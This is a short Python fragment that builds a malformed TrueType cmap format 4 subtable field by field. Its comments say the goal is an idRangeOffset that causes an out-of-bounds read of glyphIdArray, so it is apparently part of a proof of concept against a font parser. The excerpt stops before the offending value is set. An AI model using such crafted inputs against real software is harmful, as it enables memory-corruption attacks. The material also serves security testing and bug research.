    sub = b''
    sub += be16(4)  # format
    sub += be16(length)  # length
    sub += be16(0)  # language
    sub += be16(segCountX2)  # segCountX2
    sub += be16(0)  # searchRange
    sub += be16(0)  # entrySelector
    sub += be16(0)  # rangeShift
    sub += be16(0)  # endCount[0]
    sub += be16(0)  # reservedPad
    sub += be16(0)  # startCount[0]
    sub += be16(0)  # idDelta[0]
    # idRangeOffset[0]: we want index to be large
    # index = rangeOffset/2 + (codepoint - startCount[0]) + 0 - 1
    # codepoint=0, startCount=0: index = rangeOffset/2 - 1
    # We want index >= 1 (to read glyphIdArray[1] which is OOB)
